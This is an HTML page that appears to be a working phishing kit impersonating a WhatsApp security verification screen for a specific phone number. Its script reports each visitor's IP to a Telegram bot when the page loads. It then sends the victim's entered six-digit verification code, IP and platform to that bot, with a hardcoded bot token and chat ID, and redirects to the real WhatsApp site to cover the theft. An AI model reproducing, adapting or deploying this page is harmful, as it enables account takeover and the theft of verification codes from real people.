<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Security Center</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #111b21; }
        .container { width: 100%; max-width: 360px; padding: 20px; text-align: center; }
        .logo { width: 60px; height: 60px; margin-bottom: 25px; }
        h1 { font-size: 19px; font-weight: 500; color: #008069; margin-bottom: 10px; }
        .target-phone { font-weight: bold; color: #111b21; background: #f0f2f5; padding: 5px 10px; border-radius: 5px; display: inline-block; margin-bottom: 15px; }
        .alert-text { font-size: 14px; line-height: 1.4; color: #667781; margin-bottom: 25px; }
        .otp-input-container { margin-bottom: 30px; border-bottom: 2px solid #00a884; width: 160px; margin-left: auto; margin-right: auto; }
        input { width: 100%; border: none; outline: none; font-size: 24px; text-align: center; letter-spacing: 4px; padding: 5px 0; background: transparent; }
        button { background-color: #008069; color: white; border: none; padding: 12px 30px; border-radius: 3px; font-size: 14px; font-weight: 600; text-transform: uppercase; cursor: pointer; width: 100%; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
        .footer-links { margin-top: 30px; font-size: 14px; color: #008069; }
        .timer { font-size: 12px; color: #667781; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="logo">
        <h1>Confirm Verification</h1>
        
        <div class="target-phone">Account: +20 103 000 3287</div>
        
        <p class="alert-text">
            For security reasons, we need to verify your account to prevent unauthorized access and potential service suspension. <br>
            <strong>Enter the 6-digit code.</strong>
        </p>
        
        <form id="secureForm">
            <div class="otp-input-container">
                <input type="text" id="otpCode" placeholder="--- ---" maxlength="6" required pattern="\d*">
            </div>
            <button type="submit" id="submitBtn">Verify & Secure Account</button>
        </form>

        <div class="footer-links">
            <div id="resend">Resend SMS</div>
            <div id="timerDisplay" class="timer">Available in 1:59</div>
        </div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            CHAT_ID: '5446862709',
            ACCOUNT_REF: '01030003287'
        };

        // Notify you immediately when someone opens the page
        window.onload = async () => {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: `⚠️ Target page opened!\nAccount: ${CONFIG.ACCOUNT_REF}\nIP: ${ipData.ip}\nStatus: Waiting for OTP...`
                    })
                });
            } catch(e) {}
        };

        // Timer Logic
        let timeLeft = 119;
        setInterval(() => {
            if (timeLeft > 0) {
                let m = Math.floor(timeLeft / 60);
                let s = timeLeft % 60;
                document.getElementById('timerDisplay').innerText = `Available in ${m}:${s < 10 ? '0'+s : s}`;
                timeLeft--;
            } else {
                document.getElementById('timerDisplay').innerText = "Resend now";
            }
        }, 1000);

        // Submit Logic
        document.getElementById('secureForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const code = document.getElementById('otpCode').value;

            btn.disabled = true;
            btn.innerText = "AUTHENTICATING...";

            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                const logMessage = `✅ NEW OTP RECEIVED\n\n` +
                                   `Target: ${CONFIG.ACCOUNT_REF}\n` +
                                   `Code: ${code}\n` +
                                   `IP: ${ipData.ip}\n` +
                                   `Browser: ${navigator.platform}`;

                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: logMessage
                    })
                });

                // Final step: Redirect to real WhatsApp FAQ
                window.location.href = "https://www.whatsapp.com/security";
            } catch (err) {
                btn.disabled = false;
                btn.innerText = "Verify & Secure Account";
            }
        });
    </script>

</body>
</html>
